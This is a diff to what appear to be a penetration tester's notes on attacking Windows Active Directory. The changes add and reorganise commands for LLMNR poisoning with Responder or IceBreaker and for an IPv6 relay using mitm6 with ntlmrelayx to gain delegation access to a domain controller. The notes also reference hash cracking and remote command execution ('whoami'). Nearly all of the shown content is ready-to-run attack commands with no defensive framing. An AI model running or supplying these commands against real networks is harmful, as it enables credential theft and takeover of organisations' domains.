@@ -4,9 +4,11 @@ Active Directory
 	(e.g. C:\Windows\NTDS\NTDS.dit)
 
 LLMNR Poisoning
-	run Responder or IceBreaker early in the day 
-	needs lots of traffic
+	Responder or IceBreaker(github.com/DanMcInerney/icebreaker.git) 
+	run early in the day - needs lots of traffic
 
+	python icebreaker.py -l <target_file>
+	OR
 	python /opt/Responder/Responder.py -I <listening interface> -rdwv
 
 	Crack the Hash
@@ -29,7 +31,7 @@ LLMNR Poisoning
 		for command:
 			-c "whoami"
 
-Uncontrained Delegation
+Unconstrained Delegation after IPv6 Bypass
 		run in parallel:
 			mitm6 -hw <victim PC name> -d <domain> --ignore-nofqdn
 			ntlmrelayx.py -t ldaps://<victim DC IP or address> -wh <attacker_fakehost> --delegate-access
